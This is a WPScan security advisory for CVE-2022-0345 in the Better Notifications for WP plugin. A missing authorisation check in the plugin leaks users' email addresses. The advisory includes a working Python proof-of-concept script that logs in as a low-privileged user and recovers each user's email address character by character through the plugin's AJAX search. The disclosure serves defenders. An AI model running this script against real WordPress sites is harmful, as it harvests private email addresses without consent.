=== Content from wpscan.com_440dd17c_20250108_123047.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Better Notifications for WP < 1.8.7 - Email Address Disclosure

### Description

The plugin does not have authorisation and CSRF check in its bnfw\_search\_users AJAX action, allowing any authenticated users to call it and query for user e-mail prefixes (finding the first letter, then the second one, then the third one etc.).

### Proof of Concept

import sys
import string
import urllib.parse
import requests
BASE\_URL = "http://127.0.0.1:8001/"
USERNAME = "subscriber"
PASSWORD = "subscriber"
# This exploit doesn't detect stars in e-mail addresses.
EMAIL\_CHARSET = (
"".join([x for x in string.ascii\_letters if x == x.lower()])
+ string.digits
+ "!#$%&'+-/=?^\_`{|}~.@:"
)
with requests.Session() as s:
cookies = {"wordpress\_test\_cookie": "WP Cookie check"}
data = {
"log": USERNAME,
"pwd": PASSWORD,
"wp-submit": "Log In",
"redirect\_to": BASE\_URL,
"testcookie": "1",
}
response = s.post(BASE\_URL + "wp-login.php", cookies=cookies, data=data)
def get\_users\_by\_query(query: str) -> dict:
response = s.get(
BASE\_URL
+ "/wp-admin/admin-ajax.php?action=bnfw\_search\_users&query="
+ urllib.parse.quote(query)
)
response\_decoded = response.json()
for item in response\_decoded:
if item["text"] == "Users":
return item["children"]
USERS = {}
for user in get\_users\_by\_query(""):
USERS[user["id"]] = user["text"]
for user\_id, user\_name in USERS.items():
print(f"Getting e-mail of {user\_name}... :")
email\_candidates = [""]
finished\_candidates = []
while len(email\_candidates) > 0:
new\_candidates = []
for candidate in email\_candidates:
found = False
for char in EMAIL\_CHARSET:
for item in get\_users\_by\_query(candidate + char):
if item["id"] == user\_id:
new\_candidates.append(candidate + char)
found = True
if not found:
finished\_candidates.append(candidate)
email\_candidates = [
candidate
for candidate in new\_candidates
if not candidate.startswith(user\_id + ".")
and not candidate.startswith("http:")
]
print("candidates: ", email\_candidates + finished\_candidates)
print([candidate for candidate in email\_candidates + finished\_candidates if "@" in candidate])

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

bnfw](https://a8cteam5105.wordpress.com/plugin/bnfw/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.8.7

### References

CVE
[CVE-2022-0345](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0345)

### Classification

Type
NO AUTHORISATION

OWASP top 10
[A5: Broken Access Control](https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control)

CWE
[CWE-862](https://cwe.mitre.org/data/definitions/862.html)

CVSS
[6.5 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
Krzysztof Zając

Submitter
Krzysztof Zając

Submitter website
<https://kazet.cc/>

Verified
Yes

WPVDB ID
[b3b523b9-6c92-4091-837a-d34e3174eb19](https://a8cteam5105.wordpress.com/vulnerability/b3b523b9-6c92-4091-837a-d34e3174eb19/)

### Timeline

Publicly Published
2022-01-31 (about 2 years ago)

Added
2022-01-31 (about 2 years ago)

Last Updated
2023-07-24 (about 1 years ago)

### Other

Published
Title

Published
2024-07-01
Title
[CRM Perks Forms < 1.1.6 - Missing Authorization to Unauthenticated Form Submission](https://a8cteam5105.wordpress.com/vulnerability/5d8e1828-7015-441e-b0ac-6dbc0353a386/)

Published
2024-04-29
Title
[Digital Publications by Supsystic < 1.7.8 - Missing Authorization](https://a8cteam5105.wordpress.com/vulnerability/39a7f5d9-c44c-4e7d-90bd-297d4aecc551/)

Published
2024-11-21
Title
[Ultimate YouTube Video & Shorts Player With Vimeo <= 3.3 - Missing Authorization to Authenticated (Subscriber+) Setting Exposure](https://a8cteam5105.wordpress.com/vulnerability/80000192-5286-4f10-a446-8022863e4278/)

Published
2024-08-07
Title
[Robin image optimizer < 1.7.0 - Missing Authorization](https://a8cteam5105.wordpress.com/vulnerability/2a47141b-f689-4732-9c43-62df4dae07c3/)

Published
2024-01-12
Title
[The Events Calendar < 6.2.9 - Unauthenticated Sensitive Information Exposure](https://a8cteam5105.wordpress.com/vulnerability/27b3156e-25af-4976-876e-db364a366213/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + [Edit Site](https://a8cteam5105.wordpress.com/wp-admin/site-editor.php?postType=wp_template&postId=a8c/wpscan//index)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

